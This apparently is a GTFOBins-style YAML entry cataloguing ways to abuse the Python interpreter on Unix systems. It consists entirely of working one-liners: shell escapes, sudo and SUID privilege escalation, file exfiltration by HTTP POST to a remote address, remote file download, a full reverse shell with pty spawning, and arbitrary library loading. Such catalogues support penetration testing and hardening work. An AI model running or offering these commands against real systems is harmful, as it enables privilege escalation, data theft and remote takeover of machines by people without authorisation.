---
functions:
  exec-interactive:
    - code: python -c 'import os; os.system("/bin/sh")'
  sudo-enabled:
    - code: sudo python -c 'import os; os.system("/bin/sh")'
  suid-enabled:
    - code: ./python -c 'import os; os.system("/bin/sh -p")'
  upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service to collect the file on the other end.
      code: |
        export URL=http://10.0.0.1/
        export LFILE=file_to_send
        python -c 'import urllib as u,urllib2 as u2,os.environ as e; u2.urlopen(u2.Request(e["URL"],u.urlencode({"d":open(e["LFILE"]).read()})))'
    - description: Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        python -m SimpleHTTPServer $LPORT
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |-
        export URL=http://10.0.0.1/file_to_get
        export LFILE=file_to_get
        python -c 'import urllib as u,os.environ as e;u.urlretrieve(e["URL"], e["LFILE"])'
  reverse-shell:
    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code> to receive the shell on the other end.
      code: |
        export RHOST=127.0.0.1
        export RPORT=12345 
        python -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
  load-library:
    - code: python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
---